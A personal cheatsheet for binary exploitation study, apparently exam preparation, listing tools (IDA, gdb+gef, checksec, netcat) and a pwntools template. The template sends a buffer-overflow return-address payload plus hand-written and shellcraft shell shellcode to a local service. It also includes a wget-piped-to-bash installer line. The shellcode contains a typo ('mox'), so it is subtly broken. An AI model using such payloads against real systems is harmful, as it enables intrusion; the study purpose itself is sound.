# Cheatsheet binary exploitation

## IDA: reverse engineering and binary analysis
- install IDA Free 9.0 (https://hex-rays.com/ida-free) in /opt/ida-free-pc-9.0
- add destop icon via /home/timniklas/.local/share/applications/ida.desktop
```
[Desktop Entry]
Name=IDA Free
Comment=Reverse Engineering
Exec=/opt/ida-free-pc-9.0/ida
Terminal=false
Type=Application
Icon=/opt/ida-free-pc-9.0/appico.png
StartupNotify=true
Categories=Development;
Keywords=IDA
```
### Show C-source code
- press F5


## objdump: quick peek at disassembly
- dump binary with:
```
objdump -M intel -d ./my_binary
```


## masm/nasm/yasm: assembler
- TODO: figure out, what to use


## gcc: compiler
switch to intel syntax, add:
```
.intel_syntax noprefix
```


## gdb + gef: Debugging and Dynamic Analysis
- install gdb + gef
```
sudo apt install gdb
bash -c "$(wget https://gef.blah.cat/sh -O -)"
```

- get docs: https://hugsy.github.io/gef/commands/pie/


## strace: trace system calls
- todo


## python + pwntools: Exploit writing
- doc: https://docs.pwntools.com/en/latest/intro.html
- install pwntools (4.13.1) via pip
```
pip install pwntools
```
- use checksec to find out which security features binary has
```
checksec --file=my_binary
```
- basic usage
```python
import pwn

# set architecture
pwn.context.arch = 'amd64'

#conn = pwn.binary('./my_binary')
conn = pwn.remote('127.0.0.1', 1024)

# receive bytes until
conn.recvuntil(b'print:')

# we want to write the address 0x00000000004011c0 into memory
# we start by filling buffer with dummy values 'A' and finish with newline '\n'
# addresses are stored in little endien (that means 0xCAFE is stored as 0xFE 0xCA)
# that means the address 0x00000000004011c0 must be transmitted as 0xc011400000000000
message = b'A' * 56 + b'\xc0\x11\x40\x00\x00\x00\x00\x00\n'
# if we do not want to worry about endienness, we can do Pack the 64-bit integer:
message = b'A' * 56 + pwn.p64(0x4011c0) + b'\n'

# write shellcode by hand
shellcode = pwn.asm('''
    lea rdi, [rip + string]
    mov rsi, 0
    mov rdx, 0
    mox rax, 2
    syscall

string:
''') + b'\\flag'
print(shellcode.hex())

# get automatic shellcode (don't do this, do manually as this won't work in exam)
shellcode = pwn.asm(pwn.shellcraft.sh())

# send bytes
conn.send(message)

# start interactive session
conn.interactive()
```


## netcat: connect to instance
- connect to server on port
```
nc 127.0.0.1 1024
```


## manpage: get info about libc and syscalls
- get information about libc
```
man 3 gets
```
- get information about syscalls: https://syscalls.mebeim.net/?table=x86/64/x64/latest
```
man 2 open
```

## Registers
- restore: rbx, rbp, r12, r13, r14, r15, rsp
- change: rax, rcx, rdx, rsi, rdi, r8, r9, r10, r11

## x86 (amd64) instruction set
- https://treeniks.github.io/x86-64-simplified/prefix.html